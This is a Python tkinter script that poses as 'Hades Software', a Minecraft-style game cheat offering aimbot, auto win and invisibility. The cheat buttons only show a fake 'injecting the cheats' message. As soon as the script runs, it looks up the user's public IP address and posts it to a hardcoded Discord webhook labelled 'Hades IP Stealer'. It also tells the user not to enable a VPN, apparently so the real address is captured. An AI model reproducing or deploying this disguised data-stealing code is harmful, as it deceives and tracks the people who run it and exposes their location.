import tkinter 
from tkinter import *
from tkinter import messagebox
import socket
from requests import get
import requests
import os 

def load():
    messagebox.showinfo("Loading...", "I'm injecting the cheats!")

messagebox.showinfo("VPN !", "We use a private API that detects and blocks VPNs, please do not enable one!")

ip = get('https://api.ipify.org').text
webhookURL = 'https://discord.com/api/webhooks/986593311852724226/9Um3bR0WdaDpA3V8vVuywALA3iVZIqAO4NUwnAEm6OA1ATM9xRr3knGb7I2CVsKKeCGJ'
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname) 

data = {
    'username': 'Hades IP Stealer',
    'embeds': [{
        'title': "I found an IP",
        'description': "**IP :** " + ip,
    }]
}

result = requests.post(webhookURL, json = data)

try:
    result.raise_for_status()
except:
    pass
root = Tk()
root.title("Hades Software")
root.geometry("400x400")
root.iconbitmap("appicon.ico")

Heading = Label(text="Hades").pack()

frame = Frame(root)

cheatno1 = Button(frame, text="Aimbot",command=load).pack()
cheatno2 = Button(frame, text="Auto Mine",command=load).pack()
cheatno3 = Button(frame, text="Auto kill",command=load).pack()
cheatno4 = Button(frame, text="Auto win (bedwars only)",command=load).pack()
cheatno5 = Button(frame, text="Auto win (Skywars only)",command=load).pack()
cheatno6 = Button(frame, text="Auto bridge ",command=load).pack()
cheatno7 = Button(frame, text="Free sword",command=load).pack()
cheatno8 = Button(frame, text="Invisible",command=load).pack()

frame.pack(expand=YES)

root.mainloop()